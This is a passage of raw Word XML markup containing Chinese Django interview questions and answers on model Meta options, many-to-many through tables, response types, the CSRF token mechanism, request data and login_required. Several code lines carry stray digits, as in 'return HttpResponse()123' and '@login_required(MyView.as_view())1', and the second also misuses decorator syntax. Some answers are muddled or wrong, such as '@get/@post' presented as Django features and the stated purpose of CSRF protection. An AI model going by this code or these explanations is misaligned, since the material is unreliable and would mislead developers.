          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> munged </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>版本来代替</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: CamelCase becomes camel case.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AA287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verbose_name_plural</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DF75F0"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这个选项是指定，模型的复数形式是什么，比如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BC32B5"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verbose_name_plural = "stories"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F21E46"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若未提供该选项</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Django </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>会使用</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> verbose_name + "s".</w:t>
      </w:r>
      <w:bookmarkStart w:id="33" w:name="_label42"/>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="6B803912" w14:textId="27640975" w:rsidR="006B2B80" w:rsidRPr="003A7EFD" w:rsidRDefault="008721E6"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34" w:name="t43"/>
      <w:bookmarkStart w:id="35" w:name="t42"/>
      <w:bookmarkEnd w:id="34"/>
      <w:bookmarkEnd w:id="35"/>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52</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的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>M2M</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>关系，如何手动生成第三张表？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311A58FB"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tags = models.ManyToManyField(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD46F52"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to="Tag",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BF8A56"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through='Article2Tag',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292ACE26"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through_fields=('article', 'tag'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A335787" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="008721E6" w:rsidRDefault="006B2B80" w:rsidP="008721E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8721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB1BA12" w14:textId="4531A8BE" w:rsidR="006B2B80" w:rsidRPr="003A7EFD" w:rsidRDefault="00AD211D"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36" w:name="t44"/>
      <w:bookmarkEnd w:id="36"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>53</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在</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中，服务端给客户端响应信息有几种方式？分别是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133C3130"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTPresponse</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0737C074"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jsonresponse,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DED698"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDB3E63" w14:textId="2769420C" w:rsidR="006B2B80" w:rsidRPr="003A7EFD" w:rsidRDefault="00AD211D" w:rsidP="003A7EF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37" w:name="t45"/>
      <w:bookmarkStart w:id="38" w:name="t46"/>
      <w:bookmarkStart w:id="39" w:name="t47"/>
      <w:bookmarkStart w:id="40" w:name="t48"/>
      <w:bookmarkStart w:id="41" w:name="t49"/>
      <w:bookmarkEnd w:id="37"/>
      <w:bookmarkEnd w:id="38"/>
      <w:bookmarkEnd w:id="39"/>
      <w:bookmarkEnd w:id="40"/>
      <w:bookmarkEnd w:id="41"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>54</w:t>
      </w:r>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的实现机制？</w:t>
      </w:r>
      <w:r w:rsidR="00234400">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>（第一种答案）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F54C83"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第一步：</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>第一次响应来自某个客户端的请求时</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后端随机产生一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>值，把这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>保存在</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SESSION</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>状态中</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同时</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后端把这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>放到</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中交给前端页面；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1584F5DD"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第二步：下次前端需要发起请求（比如发帖）的时候把这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>值加入到请求数据或者头信息中</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一起传给后端；</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Cookies:{csrftoken:xxxxx}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D8E293" w14:textId="4B546DEA" w:rsidR="006B2B80"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第三步：后端校验前端请求带过来的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SESSION</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是否一致；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673BD4AC" w14:textId="3B6AE62E" w:rsidR="00234400" w:rsidRPr="001A250B" w:rsidRDefault="00234400" w:rsidP="00234400">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054</w:t>
      </w:r>
      <w:r>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中</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的实现机制？</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>（第二种答案）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5AB242" w14:textId="77777777" w:rsidR="00234400" w:rsidRPr="00BF3003" w:rsidRDefault="00234400" w:rsidP="0023440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目的：防止用户直接向服务端发起POST请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B75893C" w14:textId="77777777" w:rsidR="00234400" w:rsidRPr="00BF3003" w:rsidRDefault="00234400" w:rsidP="0023440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用户先发送GET获取令牌csrf token: Form表单中一个隐藏的标签 + token；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071E94FF" w14:textId="77777777" w:rsidR="00234400" w:rsidRPr="00BF3003" w:rsidRDefault="00234400" w:rsidP="0023440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发起POST请求时，需要携带这个令牌csrf token；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B46B814" w14:textId="77777777" w:rsidR="00234400" w:rsidRPr="00BF3003" w:rsidRDefault="00234400" w:rsidP="0023440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在中间件的process_view方法中进行令牌校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B0CC32" w14:textId="6F7B78A1" w:rsidR="006B2B80" w:rsidRPr="000113F2" w:rsidRDefault="00234400" w:rsidP="000113F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在html中添加{%csrf_token%}标签。</w:t>
      </w:r>
      <w:bookmarkStart w:id="42" w:name="t50"/>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="2E9657D5" w14:textId="2ADBFEC3" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="00AD211D" w:rsidP="002111E5">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43" w:name="t51"/>
      <w:bookmarkEnd w:id="43"/>
      <w:r w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>05</w:t>
      </w:r>
      <w:r w:rsidR="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="002111E5">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 xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>获取用户前端请求数据的几种方式？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B44CA9"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@get</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>@post</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EDD7C6"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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：在</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板下编写测试函数</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记得在</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件中进行相应配置</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7B7B62"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2</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：将刚刚封装的函数所在模板引入</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>views.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3917C6"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3</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>@get</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>进行拦截</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F51D11C"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@params</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response_success</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response_failure</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CFF245"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第一种</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048E0568"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@login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57720D12"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def simple_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6C3E69"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return HttpResponse()123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA317F0"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xml:space="preserve">2 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过对基于函数视图或者基于类视图使用一个装饰器实现控制：</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DA2B34"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@login_required(MyView.as_view())1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B83BA2"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xml:space="preserve">3 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过覆盖</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>mixin</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
